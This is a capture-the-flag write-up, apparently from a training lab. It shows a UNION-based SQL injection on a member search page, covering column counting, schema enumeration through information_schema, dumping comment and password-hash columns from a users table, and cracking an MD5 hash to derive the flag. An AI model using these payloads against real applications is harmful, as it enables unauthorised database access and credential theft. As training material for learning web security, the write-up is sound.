# member

We go to `/?page=survey`. We see an input that allows us to search for a user by its id.

We try a few different numbers. `5` yields something interesting :

```
ID: 5 
First name: Flag
Surname : GetThe
```

This looks like a classic SQL injection. We try the following exploit :

```
5 UNION SELECT 1
```

We get the error message `The used SELECT statements have a different number of columns`. This is normal : we need to figure out how many columns are returned by the section left of `UNION`.

We do this by adding to the `SELECT` : we try `SELECT 1`, `SELECT 1,2`, `SELECT 1,2,3`...

`SELECT 1,2` seems to work ; now we can start replacing the numbers with useful queries.

We try the following :

```
5 UNION SELECT table_name, column_name FROM information_schema.columns
```

We look for anything related to `member` or `user` ; we find information on the `users` table :

```
ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : user_id

ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : first_name

ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : last_name

ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : town

ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : country

ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : planet

ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : Commentaire

ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : countersign
```

This tells us there's a `users` table, with the following fields :

- user_id
- first_name
- last_name
- town
- country
- planet
- Commentaire
- countersign

We take a look at those last two using :

```
5 UNION SELECT Commentaire, countersign FROM users
```

The last user listed reads :

```
ID: 5 UNION SELECT Commentaire, countersign FROM users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

The comment seems to indicate we should decrypt the 'countersign'. It's an MD5. We decrypt it over at [MD5decrypt](https://md5decrypt.net/). We get :

```
FortyTwo
```

Following the instructions, we encrypt the lowercase version with SHA256 and get :

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```